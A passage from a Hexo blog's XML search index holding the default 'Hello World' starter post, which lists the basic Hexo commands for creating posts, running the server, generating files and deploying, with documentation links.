      <url>/2023/09/18/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
